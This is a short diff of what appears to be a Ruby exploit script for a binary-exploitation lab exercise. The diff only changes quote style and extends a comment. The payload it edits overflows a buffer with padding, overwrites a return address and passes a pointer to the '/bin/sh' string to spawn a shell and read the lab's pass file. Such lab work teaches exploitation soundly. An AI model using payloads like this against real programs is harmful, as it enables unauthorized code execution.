@@ -1,5 +1,5 @@
-payload  = 'A' * 27 + [0x080486bd].pack("<I")
-payload += 'A' * 4 + [0x80487d0].pack("<I")    # Pointer to "/bin/sh" in the .rodata section.
+payload  = 'A' * 27 + [0x080486bd].pack('<I')
+payload += 'A' * 4 + [0x80487d0].pack('<I')    # Pointer to "/bin/sh" in the .rodata section (char *exec_string = "/bin/sh").
 
 flag = '/tmp/lab2A.pass'
 
